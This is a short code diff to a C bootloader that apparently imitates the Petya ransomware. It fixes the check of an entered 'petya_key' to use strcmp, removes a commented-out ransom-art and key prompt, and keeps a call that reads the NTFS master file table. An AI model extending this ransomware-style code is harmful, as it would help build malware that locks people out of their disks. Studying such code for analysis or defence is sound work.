@@ -7,6 +7,7 @@
 #include "keyboard.h"
 #include "types.h"
 #include "ntfs.h"
+#include "utils.h"
 
 #define VGA_BASE ((volatile uint16_t *)0xB8000)
 #define VGA_COLS 80
@@ -289,7 +290,7 @@ void bootloader_main(uint32_t boot_drive)
 
         keyboard_readline(key, sizeof(key));
 
-        if (*petya_key == *key)
+        if (strcmp(key, petya_key) == 0)
         {
             vga_puts("YES!");
             break;
@@ -299,22 +300,7 @@ void bootloader_main(uint32_t boot_drive)
         vga_puts('\n');
     }
 
-    /*
-    vga_clear();
-    vga_set_color(COLOR_RED_ON_BLACK);
-    print_petya_art();
-
     ntfs_read_mft(2048);
-
-    vga_putchar('\n');
-
-    vga_puts("Enter key: ");
-    char key[64];
-    keyboard_readline(key, sizeof(key));
-
-    vga_puts("\nOK!\n");
-
-    */
 
     __asm__ volatile ("cli\n.Lhang: hlt\njmp .Lhang\n");
     __builtin_unreachable();
